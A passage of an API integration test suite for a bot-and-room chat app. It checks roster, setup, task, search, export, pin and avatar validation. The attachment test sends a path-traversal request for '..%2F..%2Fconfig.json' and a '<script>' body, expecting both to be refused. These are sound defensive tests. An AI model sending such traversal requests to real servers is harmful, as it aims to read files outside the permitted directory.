    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Crop", memberIds: [bot.id] })).body.group;
    try {
      const cropped = await api("PATCH", `/api/groups/${room.id}`, { avatarCrop: "rounded" });
      expect(cropped.status).toBe(200);
      expect(cropped.body.group.avatarCrop).toBe("rounded");
      const cleared = await api("PATCH", `/api/groups/${room.id}`, { avatarCrop: null });
      expect(cleared.status).toBe(200);
      expect(cleared.body.group.avatarCrop).toBeNull();
      const bad = await api("PATCH", `/api/groups/${room.id}`, { avatarCrop: "hexagon" });
      expect(bad.status).toBe(400);
      expect(bad.body.error).toMatch(/avatarCrop must be mascot, circle, rounded, or square/);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("refuses to empty a room's roster", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Never empty", memberIds: [bot.id] })).body.group;
    try {
      for (const memberIds of [[], ["no-such-bot"]]) {
        const attempted = await api("PATCH", `/api/groups/${room.id}`, { memberIds });
        expect(attempted.status).toBe(400);
        expect(attempted.body.error).toMatch(/at least one bot|unknown room member/i);
      }
      const state = (await api("GET", "/api/bots")).body;
      expect(state.groups.find((group: { id: string }) => group.id === room.id).memberIds).toEqual([bot.id]);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("deduplicates repeated room members while preserving their first-seen order", async () => {
    const [first, second] = await Promise.all([api("POST", "/api/bots"), api("POST", "/api/bots")]).then(
      (created) => created.map((response) => response.body.bot),
    );
    const room = (await api("POST", "/api/groups", { name: "Unique roster", memberIds: [first.id] })).body.group;
    try {
      const patched = await api("PATCH", `/api/groups/${room.id}`, {
        memberIds: [second.id, first.id, second.id, first.id],
      });
      expect(patched.status).toBe(200);
      expect(patched.body.group.memberIds).toEqual([second.id, first.id]);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      for (const bot of [first, second]) await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("keeps direct-message channels a fixed pair at the API boundary", async () => {
    const attempted = await api("PATCH", "/api/groups/test-dm", { memberIds: ["test-bot-a"] });
    expect(attempted.status).toBe(400);
    expect(attempted.body.error).toMatch(/direct-message.*members/i);
    const state = await api("GET", "/api/bots");
    const dm = state.body.groups.find((group: { id: string }) => group.id === "test-dm");
    expect(dm.memberIds).toEqual(["test-bot-a", "test-bot-b"]);
  });

  it("hands the lead to a remaining member when the lead leaves the room", async () => {
    const [lead, other] = await Promise.all([api("POST", "/api/bots"), api("POST", "/api/bots")]).then((created) =>
      created.map((response) => response.body.bot),
    );
    const room = (await api("POST", "/api/groups", { name: "Handover", memberIds: [lead.id, other.id] })).body.group;
    try {
      expect(room.defaultResponder).toEqual({ kind: "member", botId: lead.id });
      const patched = await api("PATCH", `/api/groups/${room.id}`, { memberIds: [other.id] });
      expect(patched.status).toBe(200);
      expect(patched.body.group.defaultResponder).toEqual({ kind: "member", botId: other.id });
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      for (const bot of [lead, other]) await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("persists room setup and blocks the first message until it is finished", async () => {
    const bot = (await api("GET", "/api/bots")).body.bots[0];
    const created = await api("POST", "/api/groups", { name: "Setup probe", memberIds: [bot.id] });
    expect(created.status).toBe(201);
    const group = created.body.group;
    try {
      expect(group).toMatchObject({ setupCompletedAt: null, setupSkippedAt: null, messages: [] });
      const blocked = await api("POST", `/api/groups/${group.id}/messages`, { text: "before setup" });
      expect(blocked.status).toBe(409);
      expect((await api("GET", "/api/bots")).body.groups.find((candidate: { id: string }) => candidate.id === group.id).messages).toHaveLength(0);

      const invalid = await api("PATCH", `/api/groups/${group.id}/setup`, {
        action: "complete",
        cwd: null,
        bulletin: "",
        defaultResponder: { kind: "member", botId: "missing" },
      });
      expect(invalid.status).toBe(400);

      const completed = await api("PATCH", `/api/groups/${group.id}/setup`, {
        action: "complete",
        cwd: null,
        bulletin: "shared brief",
        defaultResponder: { kind: "member", botId: bot.id },
      });
      expect(completed.status).toBe(200);
      expect(completed.body.group).toMatchObject({ bulletin: "shared brief", setupCompletedAt: expect.any(Number) });
      expect((await api("GET", "/api/bots")).body.groups.find((candidate: { id: string }) => candidate.id === group.id)).toMatchObject({
        bulletin: "shared brief",
        setupSkippedAt: null,
      });
    } finally {
      await api("DELETE", `/api/groups/${group.id}`);
    }
  });

  it("creates an MCP-ready channel in one request without exposing partial setup", async () => {
    const bot = (await api("GET", "/api/bots?messages=0")).body.bots[0];
    const created = await api("POST", "/api/groups", {
      name: "Atomic setup",
      memberIds: [bot.id],
      section: "Work",
      setup: {
        bulletin: "Keep updates concise.",
        defaultResponder: { kind: "mentions" },
      },
    });
    expect(created.status).toBe(201);
    const group = created.body.group;
    try {
      expect(group).toMatchObject({
        name: "Atomic setup",
        memberIds: [bot.id],
        section: "Work",
        bulletin: "Keep updates concise.",
        defaultResponder: { kind: "mentions" },
        setupSkippedAt: null,
      });
      expect(group.setupCompletedAt).toEqual(expect.any(Number));
      expect((await api("POST", `/api/groups/${group.id}/messages`, { text: "A quiet update" })).status).toBe(202);
    } finally {
      await api("POST", `/api/groups/${group.id}/interrupt`, {});
      await api("DELETE", `/api/groups/${group.id}`);
    }
  });

  it("rejects an entire channel roster when any requested member is unknown", async () => {
    const bot = (await api("GET", "/api/bots?messages=0")).body.bots[0];
    const before = (await api("GET", "/api/bots?messages=0")).body.groups.length;
    const rejectedCreate = await api("POST", "/api/groups", {
      name: "No partial roster",
      memberIds: [bot.id, "missing-bot"],
    });
    expect(rejectedCreate.status).toBe(400);
    expect(rejectedCreate.body.error).toContain("missing-bot");
    expect((await api("GET", "/api/bots?messages=0")).body.groups).toHaveLength(before);

    const room = (await api("POST", "/api/groups", { name: "Stable roster", memberIds: [bot.id] })).body.group;
    try {
      const rejectedPatch = await api("PATCH", `/api/groups/${room.id}`, {
        memberIds: [bot.id, "missing-bot"],
      });
      expect(rejectedPatch.status).toBe(400);
      const reread = (await api("GET", "/api/bots?messages=0")).body.groups.find(
        (candidate: { id: string }) => candidate.id === room.id,
      );
      expect(reread.memberIds).toEqual([bot.id]);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
    }
  });

  it("creates, switches, renames and deletes independent channel tasks", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Parallel work", memberIds: [bot.id] })).body.group;
    try {
      expect(room.tasks).toHaveLength(1);
      expect(room.tasks[0].threadId).toBe(room.threadId);
      expect(room.tasks[0].lastActivity).toEqual(expect.any(Number));
      const listed = (await api("GET", "/api/bots?messages=0")).body.groups.find(
        (candidate: { id: string }) => candidate.id === room.id,
      );
      expect(listed.tasks[0]).toEqual(
        expect.objectContaining({ threadId: room.threadId, lastActivity: expect.any(Number) }),
      );
      const originalThread = room.threadId;

      const created = await api("POST", `/api/groups/${room.id}/tasks`, { title: "Launch plan" });
      expect(created.status).toBe(201);
      expect(created.body.group.threadId).toBe(created.body.task.threadId);
      expect(created.body.group.messages).toEqual([]);
      expect(created.body.group.tasks).toHaveLength(2);

      const newThread = created.body.task.threadId;
      const renamed = await api("PATCH", `/api/groups/${room.id}/tasks/${newThread}`, {
        title: "Release plan",
      });
      expect(renamed.status).toBe(200);
      expect(renamed.body.task.title).toBe("Release plan");

      const switched = await api("POST", `/api/groups/${room.id}/tasks/${originalThread}`);
      expect(switched.status).toBe(200);
      expect(switched.body.group.threadId).toBe(originalThread);
      expect(switched.body.group.tasks.find((task: { threadId: string }) => task.threadId === newThread).title).toBe("Release plan");

      const removed = await api("DELETE", `/api/groups/${room.id}/tasks/${newThread}`);
      expect(removed.status).toBe(200);
      expect(removed.body.group.tasks).toHaveLength(1);
      expect((await api("DELETE", `/api/groups/${room.id}/tasks/${originalThread}`)).status).toBe(400);
      expect((await api("POST", `/api/groups/${room.id}/tasks/missing-thread`)).status).toBe(404);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("rejects null and array task, channel, and bot mutation bodies", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Object bodies", memberIds: [bot.id] })).body.group;
    try {
      const routes = [
        ["POST", `/api/groups/${room.id}/tasks`],
        ["PATCH", `/api/groups/${room.id}/tasks/${room.threadId}`],
        ["PATCH", `/api/groups/${room.id}`],
        ["PATCH", `/api/bots/${bot.id}`],
      ] as const;
      for (const [method, path] of routes) {
        for (const body of ["null", "[]"]) {
          const response = await fetch(`${BASE}${path}`, {
            method,
            headers: { "content-type": "application/json" },
            body,
          });
          expect(response.status).toBe(400);
          expect(await response.json()).toEqual({ error: "body must be a JSON object" });
        }
      }
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("keeps bot-to-bot channels single-threaded and blocks task changes on an open approval", async () => {
    const dm = await api("POST", "/api/groups/test-dm/tasks", {});
    expect(dm.status).toBe(400);
    expect(dm.body.error).toMatch(/one canonical conversation/i);

    const blocked = await api("POST", "/api/groups/test-stranded-room/tasks", {});
    expect(blocked.status).toBe(409);
    expect(blocked.body.error).toMatch(/waiting on you/i);
  });

  it("keeps direct-message channels folderless at the API boundary", async () => {
    const attempted = await api("PATCH", "/api/groups/test-dm", { cwd: home });
    expect(attempted.status).toBe(400);
    expect(attempted.body.error).toMatch(/direct-message.*working folder/i);
    const state = await api("GET", "/api/bots");
    expect(state.body.groups.find((group: { id: string }) => group.id === "test-dm")).not.toHaveProperty("cwd");
    expect((await api("DELETE", "/api/groups/test-dm")).status).toBe(200);
  });

  it("rejects working-folder changes after a room has pinned its first turn", async () => {
    const attempted = await api("PATCH", "/api/groups/test-pinned-room", { cwd: home });
    expect(attempted.status).toBe(409);
    expect(attempted.body.error).toMatch(/fixed after its first turn/i);
    const state = await api("GET", "/api/bots");
    expect(state.body.groups.find((group: { id: string }) => group.id === "test-pinned-room")).not.toHaveProperty("cwd");
    expect((await api("DELETE", "/api/groups/test-pinned-room")).status).toBe(200);
  });

  it("renames rooms through a bounded non-empty name", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Old room", memberIds: [bot.id] })).body.group;
    try {
      const renamed = await api("PATCH", `/api/groups/${room.id}`, { name: "  Project Atlas  " });
      expect(renamed.status).toBe(200);
      expect(renamed.body.group.name).toBe("Project Atlas");

      for (const name of ["", "   ", 42, "x".repeat(101)]) {
        expect((await api("PATCH", `/api/groups/${room.id}`, { name })).status).toBe(400);
      }

      const state = (await api("GET", "/api/bots")).body;
      expect(state.groups.find((group: { id: string }) => group.id === room.id).name).toBe("Project Atlas");
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("describes the configured fleet, shadows included", async () => {
    const { status, body } = await api("GET", "/api/instances");
    expect(status).toBe(200);
    const ghost = body.instances.find((instance: { instanceId: string }) => instance.instanceId === "ghost");
    expect(ghost).toMatchObject({
      instanceId: "ghost",
      driverKind: "not-a-real-driver",
      displayName: "Ghost",
      snapshot: { state: "unavailable" },
    });
    expect(ghost.snapshot.reason).toContain("not-a-real-driver");
    expect(body.instances).toContainEqual(expect.objectContaining({
      instanceId: "claude",
      driverKind: "claudeAgent",
      displayName: "Fixture Claude",
    }));
  });

  it("searches transcripts and exports a conversation", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    // every new bot opens with a seeded greeting — a known searchable string
    const hits = await api("GET", "/api/search?q=nice%20to%20meet");
    expect(hits.status).toBe(200);
    const hit = hits.body.hits.find((h: { botId?: string }) => h.botId === bot.id);
    expect(hit).toMatchObject({
      botId: bot.id,
      threadId: bot.threadId,
      name: bot.name,
      kind: "text",
      onActivePath: true,
    });
    expect(hit.snippet.toLowerCase()).toContain("nice to meet");
    expect(hit.snippet.slice(hit.matchStart, hit.matchStart + hit.matchLength).toLowerCase()).toBe("nice to meet");
    expect((await api("GET", "/api/search?q=")).body.hits).toEqual([]);
    const scoped = await api("GET", `/api/search?q=nice%20to%20meet&threadId=${bot.threadId}`);
    expect(scoped.status).toBe(200);
    expect(scoped.body.hits.every((candidate: { threadId: string }) => candidate.threadId === bot.threadId)).toBe(true);
    expect((await api("GET", "/api/search?q=hello&threadId=missing-thread")).status).toBe(404);

    const markdown = await fetch(`${BASE}/api/threads/${bot.threadId}/export`);
    expect(markdown.status).toBe(200);
    expect(markdown.headers.get("content-type")).toContain("text/markdown");
    expect(markdown.headers.get("content-disposition")).toContain("attachment");
    const text = await markdown.text();
    expect(text).toContain("Nice to meet you");

    const asJson = await api("GET", `/api/threads/${bot.threadId}/export?format=json`);
    expect(asJson.status).toBe(200);
    expect(asJson.body.messages.length).toBeGreaterThan(0);
    expect(JSON.stringify(asJson.body)).not.toContain('"png"');
    expect((await api("GET", `/api/threads/${bot.threadId}/export?format=pdf`)).status).toBe(400);
    expect((await api("GET", "/api/threads/nope/export")).status).toBe(404);

    // one pinned message per thread: pin, round-trip, replace, clear; the
    // id is stored verbatim — resolution is the UI's job
    const pin = await api("PATCH", `/api/bots/${bot.id}`, { pinnedMessageId: "msg-abc_123" });
    expect(pin.status).toBe(200);
    expect(pin.body.bot).toMatchObject({ pinnedMessageId: "msg-abc_123" });
    const repin = await api("PATCH", `/api/bots/${bot.id}`, { pinnedMessageId: "msg-second" });
    expect(repin.body.bot).toMatchObject({ pinnedMessageId: "msg-second" });
    expect((await api("PATCH", `/api/bots/${bot.id}`, { pinnedMessageId: "not an id!" })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { pinnedMessageId: 42 })).status).toBe(400);
    const unpinned = await api("PATCH", `/api/bots/${bot.id}`, { pinnedMessageId: null });
    expect(unpinned.status).toBe(200);
    expect(unpinned.body.bot).not.toHaveProperty("pinnedMessageId");

    const room = (await api("POST", "/api/groups", { name: "Pins", memberIds: [bot.id] })).body.group;
    const roomPin = await api("PATCH", `/api/groups/${room.id}`, { pinnedMessageId: "msg-room_1" });
    expect(roomPin.status).toBe(200);
    expect(roomPin.body.group).toMatchObject({ pinnedMessageId: "msg-room_1" });
    const roomRepin = await api("PATCH", `/api/groups/${room.id}`, { pinnedMessageId: "msg-room_2" });
    expect(roomRepin.body.group).toMatchObject({ pinnedMessageId: "msg-room_2" });
    expect((await api("PATCH", `/api/groups/${room.id}`, { pinnedMessageId: "not an id!" })).status).toBe(400);
    expect((await api("PATCH", `/api/groups/${room.id}`, { pinnedMessageId: 42 })).status).toBe(400);
    const roomCleared = await api("PATCH", `/api/groups/${room.id}`, { pinnedMessageId: "" });
    expect(roomCleared.status).toBe(200);
    expect(roomCleared.body.group).not.toHaveProperty("pinnedMessageId");

    // deleted conversations drop out of search rather than 404ing it
    await api("DELETE", `/api/bots/${bot.id}`);
    const after = await api("GET", "/api/search?q=nice%20to%20meet");
    expect(after.body.hits.find((h: { botId?: string }) => h.botId === bot.id)).toBeUndefined();
  });

  it("stores a room reply as a flat reference and rejects foreign targets", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const foreign = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Reply room", memberIds: [bot.id] })).body.group;
    try {
      await api("PATCH", `/api/groups/${room.id}/setup`, { action: "skip" });
      await api("PATCH", `/api/groups/${room.id}`, { defaultResponder: { kind: "mentions" } });
      expect((await api("POST", `/api/groups/${room.id}/messages`, { text: "First thought" })).status).toBe(202);
      let current = (await api("GET", "/api/bots?messages=20")).body.groups.find(
        (candidate: { id: string }) => candidate.id === room.id,
      );
      const original = current.messages.at(-1);
      expect((await api("POST", `/api/groups/${room.id}/messages`, {
        text: "Following up",
        replyToId: original.id,
      })).status).toBe(202);
      current = (await api("GET", "/api/bots?messages=20")).body.groups.find(
        (candidate: { id: string }) => candidate.id === room.id,
      );
      expect(current.messages.at(-1)).toMatchObject({ text: "Following up", replyToId: original.id });
      expect((await api("POST", `/api/groups/${room.id}/messages`, {
        text: "Wrong conversation",
        replyToId: foreign.messages[0].id,
      })).status).toBe(404);
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${bot.id}`);
      await api("DELETE", `/api/bots/${foreign.id}`);
    }
  }, 30000);

  it("creates, patches, and deletes a bot", async () => {
    const created = await api("POST", "/api/bots");
    expect(created.status).toBe(201);
    const bot = created.body.bot;

    const patched = await api("PATCH", `/api/bots/${bot.id}`, { name: "Renamed", pinned: true });
    expect(patched.status).toBe(200);
    expect(patched.body.bot).toMatchObject({ name: "Renamed", pinned: true });

    const missing = await api("PATCH", "/api/bots/does-not-exist", { name: "x" });
    expect(missing.status).toBe(404);

    // persona fields are bounded at the write boundary — they reach system
    // prompts (Chief roster, room rosters), so an unbounded PATCH is a
    // token-burn and prompt-injection surface
    expect((await api("PATCH", `/api/bots/${bot.id}`, { name: "N".repeat(101) })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { name: "   " })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { title: "T".repeat(201) })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { description: "D".repeat(4001) })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { description: 7 })).status).toBe(400);

    // the per-bot composio gate is a boolean, and it round-trips
    expect((await api("PATCH", `/api/bots/${bot.id}`, { composio: "yes" })).status).toBe(400);
    const gated = await api("PATCH", `/api/bots/${bot.id}`, { composio: false });
    expect(gated.status).toBe(200);

    // sidebar sections: assign, round-trip, trim, clear — and the field
    // drops off the record entirely once cleared rather than lingering
    // as an empty string through exports and wire frames
    const sectioned = await api("PATCH", `/api/bots/${bot.id}`, { section: "  Research  " });
    expect(sectioned.status).toBe(200);
    expect(sectioned.body.bot).toMatchObject({ section: "Research" });
    expect((await api("PATCH", `/api/bots/${bot.id}`, { section: 7 })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { section: "S".repeat(61) })).status).toBe(400);
    const cleared = await api("PATCH", `/api/bots/${bot.id}`, { section: null });
    expect(cleared.status).toBe(200);
    expect(cleared.body.bot).not.toHaveProperty("section");
    const clearedEmpty = await api("PATCH", `/api/bots/${bot.id}`, { section: "   " });
    expect(clearedEmpty.status).toBe(200);
    expect(clearedEmpty.body.bot).not.toHaveProperty("section");

    // Channels can be born inside a Work/Personal/project context, and can
    // later move through the same context contract as bots.
    const createdInContext = await api("POST", "/api/groups", {
      name: "Filed",
      memberIds: [bot.id, bot.id],
      section: "  Work  ",
    });
    expect(createdInContext.status).toBe(201);
    expect(createdInContext.body.group).toMatchObject({ section: "Work", memberIds: [bot.id] });
    expect((await api("POST", "/api/groups", { name: 7, memberIds: [bot.id] })).status).toBe(400);
    expect((await api("POST", "/api/groups", { name: "N".repeat(101), memberIds: [bot.id] })).status).toBe(400);
    expect((await api("POST", "/api/groups", { name: "Bad context", memberIds: [bot.id], section: 7 })).status).toBe(400);
    expect((await api("POST", "/api/groups", { name: "Long context", memberIds: [bot.id], section: "S".repeat(61) })).status).toBe(400);
    const sectionRoom = createdInContext.body.group;
    const roomSectioned = await api("PATCH", `/api/groups/${sectionRoom.id}`, { section: "  Clients  " });
    expect(roomSectioned.status).toBe(200);
    expect(roomSectioned.body.group).toMatchObject({ section: "Clients" });
    expect((await api("PATCH", `/api/groups/${sectionRoom.id}`, { section: 7 })).status).toBe(400);
    expect((await api("PATCH", `/api/groups/${sectionRoom.id}`, { section: "S".repeat(61) })).status).toBe(400);
    const roomSectionCleared = await api("PATCH", `/api/groups/${sectionRoom.id}`, { section: null });
    expect(roomSectionCleared.status).toBe(200);
    expect(roomSectionCleared.body.group).not.toHaveProperty("section");
    const roomSectionEmpty = await api("PATCH", `/api/groups/${sectionRoom.id}`, { section: "   " });
    expect(roomSectionEmpty.status).toBe(200);
    expect(roomSectionEmpty.body.group).not.toHaveProperty("section");
    expect((await api("DELETE", `/api/groups/${sectionRoom.id}`)).status).toBe(200);
    expect(gated.body.bot.composio).toBe(false);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { composio: true })).body.bot.composio).toBe(true);

    const deleted = await api("DELETE", `/api/bots/${bot.id}`);
    expect(deleted.status).toBe(200);
    const after = await api("GET", "/api/bots");
    expect(after.body.bots.find((b: { id: string }) => b.id === bot.id)).toBeUndefined();
  });

  it("elects one Chief of Staff per section and preserves other section Chiefs", async () => {
    console.time("post workA");
    const workA = (await api("POST", "/api/bots")).body.bot;
    console.timeEnd("post workA");
    
    console.time("post workB");
    const workB = (await api("POST", "/api/bots")).body.bot;
    console.timeEnd("post workB");
    
    console.time("post personal");
    const personal = (await api("POST", "/api/bots")).body.bot;
    console.timeEnd("post personal");
    try {
      console.time("patch workA");
      await api("PATCH", `/api/bots/${workA.id}`, { section: "Work", chiefOfStaff: true });
      console.timeEnd("patch workA");
      
      console.time("patch workB");
      await api("PATCH", `/api/bots/${workB.id}`, { section: "Work" });
      console.timeEnd("patch workB");
      
      console.time("patch personal");
      await api("PATCH", `/api/bots/${personal.id}`, { section: "Personal", chiefOfStaff: true });
      console.timeEnd("patch personal");

      let bots = (await api("GET", "/api/bots")).body.bots;
      expect(bots.find((bot: { id: string }) => bot.id === workA.id).chiefOfStaff).toBe(true);
      expect(bots.find((bot: { id: string }) => bot.id === personal.id).chiefOfStaff).toBe(true);

      await api("PATCH", `/api/bots/${workB.id}`, { chiefOfStaff: true });
      bots = (await api("GET", "/api/bots")).body.bots;
      expect(bots.find((bot: { id: string }) => bot.id === workA.id).chiefOfStaff).toBe(false);
      expect(bots.find((bot: { id: string }) => bot.id === workB.id).chiefOfStaff).toBe(true);
      expect(bots.find((bot: { id: string }) => bot.id === personal.id).chiefOfStaff).toBe(true);

      // Moving a Chief keeps its role and hands off only in the destination.
      await api("PATCH", `/api/bots/${workB.id}`, { section: "Personal" });
      bots = (await api("GET", "/api/bots")).body.bots;
      expect(bots.find((bot: { id: string }) => bot.id === workB.id).chiefOfStaff).toBe(true);
      expect(bots.find((bot: { id: string }) => bot.id === personal.id).chiefOfStaff).toBe(false);
    } finally {
      console.time("cleanup chief test");
      for (const b of [workA, workB, personal]) {
        await api("DELETE", `/api/bots/${b.id}`);
      }
      console.timeEnd("cleanup chief test");
    }
  }, 30000);

  it("explains when archived room members cannot respond", async () => {
    const archived = (await api("POST", "/api/bots")).body.bot;
    const active = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", {
      name: "Archived member feedback",
      memberIds: [archived.id, active.id],
    })).body.group;

    try {
      expect((await api("PATCH", `/api/groups/${room.id}/setup`, { action: "skip" })).status).toBe(200);
      const archivedBot = await api("PATCH", `/api/bots/${archived.id}`, {
        name: "Quill",
        hidden: true,
        chiefOfStaff: false,
      });
      expect(archivedBot.status).toBe(200);
      await api("PATCH", `/api/bots/${active.id}`, {
        name: "Atlas",
        modelSelection: { instanceId: "ghost", model: "ghost-1" },
      });
      await api("PATCH", `/api/groups/${room.id}`, { defaultResponder: { kind: "mentions" } });

      expect((await api("POST", `/api/groups/${room.id}/messages`, { text: "@Quill take this" })).status).toBe(202);
      let state = (await api("GET", "/api/bots?messages=20")).body;
      let messages = state.groups.find((group: { id: string }) => group.id === room.id).messages;
      expect(messages.at(-1)).toMatchObject({
        kind: "activity",
        tool: {
          name: "Quill is archived and can't respond — restore it or mention an active room member.",
          ok: false,
        },
      });

      const archivedError = "Quill is archived and can't respond — restore it or mention an active room member.";
      const beforeMixedMention = messages.filter((message: { tool?: { name?: string } }) =>
        message.tool?.name === archivedError
      ).length;
      await api("POST", `/api/groups/${room.id}/messages`, { text: "@Quill and @Atlas take this" });
      await expect.poll(async () => {
        state = (await api("GET", "/api/bots?messages=20")).body;
        messages = state.groups.find((group: { id: string }) => group.id === room.id).messages;
        return {
          archivedErrors: messages.filter((message: { tool?: { name?: string } }) =>
            message.tool?.name === archivedError
          ).length,
          activeDispatched: messages.some((message: { tool?: { name?: string } }) =>
            message.tool?.name === "error: Atlas's model is unavailable"
          ),
        };
      }).toEqual({ archivedErrors: beforeMixedMention + 1, activeDispatched: true });

      await api("PATCH", `/api/groups/${room.id}`, {
        defaultResponder: { kind: "member", botId: archived.id },
      });
      await api("POST", `/api/groups/${room.id}/messages`, { text: "use the default responder" });
      state = (await api("GET", "/api/bots?messages=20")).body;
      messages = state.groups.find((group: { id: string }) => group.id === room.id).messages;
      expect(messages.at(-1)?.tool).toEqual({ name: archivedError, ok: false });

      await api("PATCH", `/api/groups/${room.id}`, { defaultResponder: { kind: "mentions" } });

      const beforeUnmentioned = messages.length;
      await api("POST", `/api/groups/${room.id}/messages`, { text: "no mention" });
      state = (await api("GET", "/api/bots?messages=20")).body;
      messages = state.groups.find((group: { id: string }) => group.id === room.id).messages;
      expect(messages).toHaveLength(beforeUnmentioned + 1);
      expect(messages.at(-1)).toMatchObject({ kind: "text", role: "user", text: "no mention" });

      await api("PATCH", `/api/bots/${active.id}`, { hidden: true });
      await api("POST", `/api/groups/${room.id}/messages`, { text: "hello everyone" });
      state = (await api("GET", "/api/bots?messages=20")).body;
      messages = state.groups.find((group: { id: string }) => group.id === room.id).messages;
      expect(messages.at(-1)).toMatchObject({
        kind: "activity",
        tool: {
          name: "No active room members can respond — restore an archived bot or add an active member.",
          ok: false,
        },
      });
    } finally {
      await api("DELETE", `/api/groups/${room.id}`);
      await api("DELETE", `/api/bots/${archived.id}`);
      await api("DELETE", `/api/bots/${active.id}`);
    }
  });

  it("saves, serves, and guards image attachments", async () => {
    // a real 1x1 PNG so the bytes round-trip intact
    const png = Buffer.from(
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
      "base64",
    );

    const wrongType = await fetch(`${BASE}/api/attachments`, {
      method: "POST",
      headers: { "content-type": "text/html" },
      body: "<script>not an image</script>",
    });
    expect(wrongType.status).toBe(400);

    const textFile = await fetch(`${BASE}/api/attachments`, {
      method: "POST",
      headers: { "content-type": "text/plain" },
      body: "not an image",
    });
    expect(textFile.status).toBe(201);

    const saved = await fetch(`${BASE}/api/attachments`, {
      method: "POST",
      headers: { "content-type": "image/png" },
      body: new Uint8Array(png),
    });
    expect(saved.status).toBe(201);
    const { path: savedPath, mime, bytes } = (await saved.json()) as { path: string; mime: string; bytes: number };
    expect(mime).toBe("image/png");
    expect(bytes).toBe(png.byteLength);
    expect(savedPath).toContain("attachments");

    const name = savedPath.split(/[\\/]/).pop();
    const served = await fetch(`${BASE}/api/attachments/${name}`);
    expect(served.status).toBe(200);
    expect(served.headers.get("content-type")).toBe("image/png");
    expect(Buffer.from(await served.arrayBuffer()).equals(png)).toBe(true);

    // the serving route is name-locked to the attachments dir
    const traversal = await fetch(`${BASE}/api/attachments/..%2F..%2Fconfig.json`);
    expect(traversal.status).toBe(404);
    const unknown = await fetch(`${BASE}/api/attachments/00000000-0000-0000-0000-000000000000.png`);
    expect(unknown.status).toBe(404);

    const tooBig = await fetch(`${BASE}/api/attachments`, {
      method: "POST",
      headers: { "content-type": "image/png" },
      body: Buffer.alloc(IMAGE_MAX_BYTES + 1),
    });
    expect(tooBig.status).toBe(413);
  });

  it("persists only app-owned bot avatars and supported crop shapes", async () => {
    const created = await api("POST", "/api/bots");
    const bot = created.body.bot;
    const avatarUrl = await uploadAvatar("image/webp");

    const saved = await api("PATCH", `/api/bots/${bot.id}`, { avatarUrl, avatarCrop: "rounded" });
    expect(saved.status).toBe(200);
    expect(saved.body.bot).toMatchObject({ avatarUrl, avatarCrop: "rounded" });

    expect((await api("PATCH", `/api/bots/${bot.id}`, {
      avatarUrl: "https://tracker.example/avatar.png",
    })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, {
      avatarUrl: "/api/attachments/123e4567-e89b-12d3-a456-426614174000.webp",
    })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { avatarCrop: "hexagon" })).status).toBe(400);

    const cleared = await api("PATCH", `/api/bots/${bot.id}`, { avatarUrl: null, avatarCrop: "mascot" });
    expect(cleared.status).toBe(200);
    expect(cleared.body.bot.avatarUrl).toBeNull();
    expect(cleared.body.bot.avatarCrop).toBe("mascot");
  });

  it("limits paired profile writes to validated profile fields and broadcasts the result", async () => {
    const created = await api("POST", "/api/bots");
    const bot = created.body.bot;
    const avatarUrl = await uploadAvatar();
    const stream = await openSse(`${BASE}/api/events`);
    try {
      await stream.until((frame) => frame.kind === "hello");
      const saved = await api("PATCH", `/api/bots/${bot.id}/profile`, {
        name: "Paired Profile",
        title: "Mobile-safe agent",
        description: "Only profile data crosses this boundary.",
        notifications: false,
        avatarUrl,
        avatarCrop: "circle",
        voice: "voice_fixture",
        speakReplies: true,
      });
      expect(saved.status).toBe(200);
      expect(saved.body.bot).toMatchObject({
        name: "Paired Profile",
        title: "Mobile-safe agent",
        description: "Only profile data crosses this boundary.",
        notifications: false,
        avatarUrl,
        avatarCrop: "circle",
        voice: "voice_fixture",
        speakReplies: true,
      });
      const frame = await stream.until(
        (candidate) => candidate.kind === "bot" && candidate.bot?.id === bot.id,
      );
      expect(frame.bot).toMatchObject({ id: bot.id, avatarUrl, avatarCrop: "circle" });

      for (const invalid of [
        { color: "red" },
        { avatarUrl: "https://tracker.example/avatar.png" },
        { avatarUrl: "/api/attachments/123e4567-e89b-12d3-a456-426614174000.png" },
        { avatarCrop: "hexagon" },
        { name: 42 },
        { notifications: "yes" },
